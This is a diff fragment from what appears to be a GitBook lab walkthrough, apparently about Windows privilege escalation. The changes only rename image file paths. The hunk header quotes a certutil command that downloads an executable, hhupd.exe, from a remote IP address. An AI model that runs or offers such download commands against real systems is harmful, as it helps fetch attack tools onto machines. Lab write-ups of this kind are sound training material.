@@ -487,11 +487,11 @@ certutil -urlcache -f http://10.10.162.126:81/hhupd.exe hhupd.exe
 
 
 
-<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (67) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (36) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>
 
 Navigate to **C:\Windows\System32** and type in **\*.\*** to show all files.
 
